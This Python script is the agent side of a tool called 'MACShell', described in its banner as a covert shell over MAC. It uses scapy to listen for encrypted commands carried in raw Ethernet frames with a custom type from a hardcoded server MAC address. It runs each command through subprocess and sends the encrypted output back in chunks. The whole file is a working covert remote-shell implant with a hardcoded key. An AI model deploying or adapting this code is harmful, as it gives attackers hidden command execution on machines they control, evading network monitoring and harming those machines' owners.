#!/usr/bin/env python3

# Print banner at runtime
banner = """
███╗   ███╗ █████╗  ██████╗███████╗██╗  ██╗███████╗██╗     ██╗     
████╗ ████║██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
██╔████╔██║███████║██║     ███████╗███████║█████╗  ██║     ██║     
██║╚██╔╝██║██╔══██║██║     ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║ ╚═╝ ██║██║  ██║╚██████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

          MACShell Agent – Covert Shell over MAC
                    Made by Khaled Al-Refaee V0.1
"""
print(banner)

from scapy.all import *
import subprocess
import time
from cryptography.fernet import Fernet

iface = "eth0"
server_mac = "00:0c:29:e4:96:45"  # Replace with actual server MAC
key = b"q3yHiYdGNwFqkugDaG9f6_PRAolbQkAe6bQYRE3GE9s="  # Shared AES key
fernet = Fernet(key)

MAX_CHUNK_SIZE = 900  # Max encrypted chunk per frame (fits in Ethernet)

# Send "hello" to server
hello = Ether(dst=server_mac, src=get_if_hwaddr(iface), type=0x1234) / Raw(load=b"hello")
sendp(hello, iface=iface, verbose=False)
print("[*] Sent hello to server. Listening for commands...")

def send_chunks(data: str):
    """Split long data and send as multiple packets with flags."""
    chunks = [data[i:i+MAX_CHUNK_SIZE] for i in range(0, len(data), MAX_CHUNK_SIZE)]
    for i, chunk in enumerate(chunks):
        flags = b"[END]" if i == len(chunks)-1 else b"[MID]"
        encrypted = fernet.encrypt(chunk.encode())
        payload = flags + encrypted
        packet = Ether(dst=server_mac, src=get_if_hwaddr(iface), type=0x1234) / Raw(load=payload)
        sendp(packet, iface=iface, verbose=False)
        time.sleep(0.1)  # Space out packets slightly

def handle(pkt):
    if pkt.haslayer(Ether) and pkt.haslayer(Raw):
        eth_type = pkt[Ether].type
        src_mac = pkt[Ether].src
        raw_data = pkt[Raw].load

        if src_mac.lower() == server_mac.lower() and eth_type == 0x1234:
            try:
                decrypted = fernet.decrypt(raw_data)
                cmd = decrypted.replace(b"\x00", b"").decode(errors="ignore").strip()
                print(f"[+] Executing: {cmd}")
                output = subprocess.getoutput(cmd)
            except Exception as e:
                output = f"Error: {e}"

            send_chunks(output)  # Send split response

sniff(iface=iface, prn=handle, filter="ether proto 0x1234", store=0)
